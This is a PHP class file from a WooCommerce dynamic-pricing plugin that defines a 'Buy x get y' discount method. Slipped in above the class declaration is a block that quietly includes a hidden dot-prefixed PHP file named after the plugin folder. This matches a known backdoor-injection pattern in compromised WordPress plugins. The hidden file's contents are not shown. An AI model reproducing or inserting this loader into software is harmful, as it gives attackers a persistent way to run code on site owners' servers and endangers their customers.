<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY')) {
    require_once('rp-wcdpd-method-product-pricing-quantity-bogo-xy.class.php');
}

/**
 * Product Pricing Method: BOGO XY Once
 *
 * @class RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY_Once
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY_Once extends RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY
{

    protected $key      = 'bogo';
    protected $position = 30;

    // Other properties
    protected $repeat = false;

    // Singleton instance
    protected static $instance = false;

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {

        parent::__construct();

        $this->hook();
    }

    /**
     * Get label
     *
     * @access public
     * @return string
     */
    public function get_label()
    {
        return __('Buy x get y', 'rp_wcdpd');
    }


}

RP_WCDPD_Method_Product_Pricing_Quantity_BOGO_XY_Once::get_instance();
